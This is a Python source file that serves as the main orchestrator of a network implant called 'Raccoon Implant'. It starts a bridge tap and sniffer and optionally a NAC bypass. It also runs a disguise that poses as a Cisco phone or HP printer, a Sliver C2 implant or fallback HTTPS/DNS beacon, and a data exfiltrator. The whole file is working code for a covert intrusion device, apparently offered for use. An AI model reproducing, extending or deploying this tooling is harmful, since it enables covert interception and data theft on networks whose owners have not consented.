#!/usr/bin/env python3
"""
Raccoon Implant — main orchestrator.
Starts bridge tap, sniffer, cover identity, and C2 beacon.
"""

import logging
import signal
import sys
import time
from pathlib import Path

import yaml


def setup_logging(config: dict):
    log_cfg = config.get("logging", {})
    log_dir = Path(log_cfg.get("log_dir", "/opt/raccoon/logs"))
    log_dir.mkdir(parents=True, exist_ok=True)

    from logging.handlers import RotatingFileHandler

    fmt = logging.Formatter("%(asctime)s [%(name)s] %(levelname)s %(message)s")

    file_handler = RotatingFileHandler(
        log_dir / "raccoon.log",
        maxBytes=log_cfg.get("max_size_mb", 5) * 1024 * 1024,
        backupCount=log_cfg.get("backup_count", 3),
    )
    file_handler.setLevel(getattr(logging, log_cfg.get("file_level", "DEBUG").upper()))
    file_handler.setFormatter(fmt)

    console_handler = logging.StreamHandler()
    console_handler.setLevel(getattr(logging, log_cfg.get("console_level", "INFO").upper()))
    console_handler.setFormatter(fmt)

    root = logging.getLogger()
    root.setLevel(logging.DEBUG)
    root.addHandler(file_handler)
    root.addHandler(console_handler)


def load_config(path: str = None) -> dict:
    candidates = [
        path,
        "/opt/raccoon/raccoon.yaml",
        str(Path(__file__).parent.parent / "configs" / "raccoon.yaml"),
    ]
    for p in candidates:
        if p and Path(p).exists():
            with open(p) as f:
                return yaml.safe_load(f)
    print("No config file found", file=sys.stderr)
    sys.exit(1)


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Raccoon Implant")
    parser.add_argument("-c", "--config", help="Path to raccoon.yaml")
    args = parser.parse_args()

    config = load_config(args.config)
    setup_logging(config)
    logger = logging.getLogger("raccoon")

    from software.notifications import init_notifier
    notifier = init_notifier(config)
    logger.info("Notifications: %s", "enabled" if notifier.enabled else "disabled")

    logger.info("=" * 60)
    logger.info("  Raccoon Implant starting")
    logger.info("=" * 60)

    components = []

    if config["sniffer"]["enabled"]:
        from software.sniffer.bridge_tap import BridgeTap
        from software.watchdog import set_bridge_tap
        bridge = BridgeTap(config)
        if not bridge.setup_bridge():
            logger.error("Bridge setup failed — aborting")
            sys.exit(1)
        set_bridge_tap(bridge)
        components.append(("bridge", bridge))

    if config.get("nac_bypass", {}).get("enabled"):
        from software.nac_bypass import NACBypass
        nac = NACBypass(config)
        nac.start()
        components.append(("nac_bypass", nac))
        logger.info("NAC bypass enabled — running in background")

    if config["cover"]["enabled"]:
        cover_mode = config.get("device_mode", "cisco_phone")
        if cover_mode == "hp_printer":
            from software.cover.hp_printer import HPPrinterCover
            cover = HPPrinterCover(config)
        else:
            from software.cover.cisco_phone import CiscoCover
            cover = CiscoCover(config)
        cover.start()
        cover_cfg = config["cover"].get(cover_mode, {})
        logger.info("Cover mode: %s (hostname: %s, model: %s)",
                     cover_mode,
                     cover_cfg.get("hostname", "auto"),
                     cover_cfg.get("model", "default"))
        components.append(("cover", cover))

    if config["c2"]["enabled"]:
        from software.c2.beacon_standalone import already_running as beacon_already_running
        if beacon_already_running():
            logger.info("Standalone beacon already running — skipping embedded C2")
        else:
            c2_cfg = config["c2"]
            sliver_cfg = c2_cfg.get("sliver", {})
            fallback_cfg = c2_cfg.get("fallback", {})

            sliver_started = False
            if sliver_cfg.get("enabled"):
                from software.c2.sliver import SliverManager
                sliver = SliverManager(config)
                if sliver.is_implant_available or sliver_cfg.get("staging_url"):
                    sliver.start()
                    components.append(("sliver", sliver))
                    sliver_started = True
                    logger.info("Sliver implant manager started")
                else:
                    logger.warning("Sliver enabled but binary not found at %s — trying fallback",
                                   sliver_cfg.get("implant_path"))

            if not sliver_started and fallback_cfg.get("enabled"):
                from software.c2.beacon import Beacon
                fb_config = {
                    "c2": {
                        "beacon_interval_seconds": c2_cfg.get("beacon_interval_seconds", 300),
                        "jitter_percent": c2_cfg.get("jitter_percent", 20),
                        "encryption_key": c2_cfg.get("encryption_key", ""),
                        "https": fallback_cfg.get("https", {}),
                        "dns": fallback_cfg.get("dns", {}),
                    }
                }
                beacon = Beacon(fb_config)
                beacon.start()
                components.append(("beacon", beacon))
                logger.info("Python fallback beacon started")

        from software.c2.exfil import Exfiltrator
        exfil = Exfiltrator(config)
        exfil.start()
        components.append(("exfil", exfil))

    shutdown = False

    def handle_signal(sig, frame):
        nonlocal shutdown
        shutdown = True

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    if config["sniffer"]["enabled"]:
        import threading
        sniff_thread = threading.Thread(target=bridge.start_capture, daemon=True, name="sniffer")
        sniff_thread.start()

    logger.info("All components started — operational")

    while not shutdown:
        time.sleep(1)

    logger.info("Shutdown initiated")
    for name, component in reversed(components):
        logger.info("Stopping %s...", name)
        component.stop()

    if config["sniffer"]["enabled"]:
        bridge.teardown_bridge()

    logger.info("Raccoon Implant offline")


if __name__ == "__main__":
    main()
